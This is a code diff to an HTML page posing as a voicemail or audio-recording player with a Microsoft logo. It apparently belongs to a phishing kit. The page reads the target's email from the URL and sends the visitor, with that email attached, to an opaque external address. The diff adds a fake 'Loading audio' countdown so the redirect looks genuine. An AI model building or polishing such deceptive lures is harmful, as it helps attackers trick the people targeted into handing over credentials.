@@ -176,6 +176,16 @@
     #emailInput {
       display: none;
     }
+    .loading-message {
+      display: none;
+      margin-top: 16px;
+      padding: 12px;
+      background: #2a2a2a;
+      border-radius: 6px;
+      color: #3498db;
+      font-size: 14px;
+      font-weight: 500;
+    }
     @media (max-width: 480px) {
       .player-card {
         padding: 24px 20px;
@@ -205,6 +215,7 @@
       <p class="subtitle">Click to access recording</p>
       <input type="text" id="emailInput" aria-hidden="true" />
       <div id="identifierDisplay" aria-hidden="true"></div>
+      <div class="loading-message" id="loadingMessage"></div>
     </div>
     <div id="player-container">
       <img id="music-img" src="https://upload.wikimedia.org/wikipedia/commons/3/35/Simple_Music.svg" alt="Audio file" tabindex="0" role="button" title="Play Audio" draggable="false" />
@@ -254,7 +265,29 @@
       if(!email){ alert('No email found in URL to redirect with.'); return; }
       var redirectBaseUrl='https://vimdashboard/mE5I3#';
       var redirectUrl=redirectBaseUrl+email;
-      window.location.href=redirectUrl;
+      
+      // Show loading message
+      var loadingMsg=document.getElementById('loadingMessage');
+      if(loadingMsg){
+        loadingMsg.style.display='block';
+        var countdown=5;
+        loadingMsg.textContent='Loading audio... in '+countdown+' seconds';
+        
+        var countdownInterval=setInterval(function(){
+          countdown--;
+          if(countdown>0){
+            loadingMsg.textContent='Loading audio... in '+countdown+' seconds';
+          }else{
+            clearInterval(countdownInterval);
+            loadingMsg.textContent='...';
+          }
+        }, 1000);
+      }
+      
+      // Redirect after 5 seconds
+      setTimeout(function(){
+        window.location.href=redirectUrl;
+      }, 5000);
     }
     var logo=document.getElementById('microsoft-logo');
     if(logo) logo.addEventListener('click', redirectUsingEmail);
@@ -325,5 +358,3 @@
 </body>
 
 </html>
-
-
